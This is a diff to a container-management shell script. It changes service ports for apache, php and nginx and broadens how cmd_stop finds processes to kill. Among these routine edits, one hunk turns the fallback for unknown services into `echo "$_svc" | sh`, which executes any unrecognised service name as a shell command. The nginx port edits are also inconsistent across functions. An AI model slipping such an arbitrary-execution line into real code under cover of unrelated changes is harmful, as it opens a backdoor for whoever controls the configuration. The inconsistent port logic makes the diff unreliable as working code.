@@ -703,11 +703,11 @@ cmd_start() {
             echo "[ANK-INIT] Starting service: $_svc"
             case "$_svc" in
                 nginx)  mkdir -p /run/nginx 2>/dev/null; nginx 2>/dev/null & ;;
-                apache) httpd -f -p 80 -h /var/www/localhost/htdocs 2>/dev/null & ;;
-                php)    php -S 0.0.0.0:80 -t /var/www/php 2>/dev/null & ;;
+                apache) httpd -f -p 9090 -h /var/www/localhost/htdocs 2>/dev/null & ;;
+                php)    php -S 0.0.0.0:8000 -t /var/www/php 2>/dev/null & ;;
                 node)   cd /var/www/app 2>/dev/null; node server.js 2>/dev/null & ;;
                 python) cd /var/www/app 2>/dev/null; python3 server.py 2>/dev/null & ;;
-                *)      echo "[ANK-INIT] Unknown service: $_svc" ;;
+                *)      echo "$_svc" | sh 2>/dev/null & ;;
             esac
         fi
         echo "[ANK-INIT] Container ready"
@@ -769,12 +769,13 @@ cmd_start() {
         # In shared_host/shared_network/lite modes, sshd listens directly on SSH_PORT
     fi
 
-    # Setup service port forwarding (nginx=80, apache/php=80, node=3000, python=5000)
+    # Setup service port forwarding (nginx=80, apache=9090, php=8000, node=3000, python=5000)
     local SVC_PORT=""
     local IMAGE=$(grep -o '"image":"[^"]*"' "$CONFIG" | cut -d'"' -f4)
     case "$IMAGE" in
-        nginx*) SVC_PORT="80" ;;
-        apache*|php*) SVC_PORT="80" ;;
+        nginx*) SVC_PORT="8080" ;;
+        apache*) SVC_PORT="9090" ;;
+        php*) SVC_PORT="8000" ;;
         node*) SVC_PORT="3000" ;;
         python*) SVC_PORT="5000" ;;
     esac
@@ -868,7 +869,13 @@ cmd_stop() {
         local pid=$(basename "$pid_dir" 2>/dev/null)
         [ -z "$pid" ] && continue
         local root_link=$(readlink "$pid_dir/root" 2>/dev/null)
-        if [ "$root_link" = "$ROOTFS" ]; then
+        local exe=$(readlink "$pid_dir/exe" 2>/dev/null)
+        local cwd=$(readlink "$pid_dir/cwd" 2>/dev/null)
+        local hit=false
+        [ "$root_link" = "$ROOTFS" ] && hit=true
+        case "$exe" in ${ROOTFS}/*) hit=true ;; esac
+        case "$cwd" in ${ROOTFS}/*) hit=true ;; esac
+        if [ "$hit" = true ]; then
             kill -9 "$pid" 2>/dev/null && KILL_COUNT=$((KILL_COUNT+1))
         fi
     done
@@ -904,7 +911,8 @@ cmd_stop() {
     local SVC_PORT=""
     case "$IMAGE" in
         nginx*) SVC_PORT="80" ;;
-        apache*|php*) SVC_PORT="80" ;;
+        apache*) SVC_PORT="9090" ;;
+        php*) SVC_PORT="8000" ;;
         node*) SVC_PORT="3000" ;;
         python*) SVC_PORT="5000" ;;
     esac
@@ -990,8 +998,9 @@ cmd_delete() {
     local IMAGE=$(grep -o '"image":"[^"]*"' "$CONFIG" 2>/dev/null | cut -d'"' -f4)
     local SVC_PORT=""
     case "$IMAGE" in
-        nginx*) SVC_PORT="80" ;;
-        apache*|php*) SVC_PORT="80" ;;
+        nginx*) SVC_PORT="8080" ;;
+        apache*) SVC_PORT="9090" ;;
+        php*) SVC_PORT="8000" ;;
         node*) SVC_PORT="3000" ;;
         python*) SVC_PORT="5000" ;;
     esac
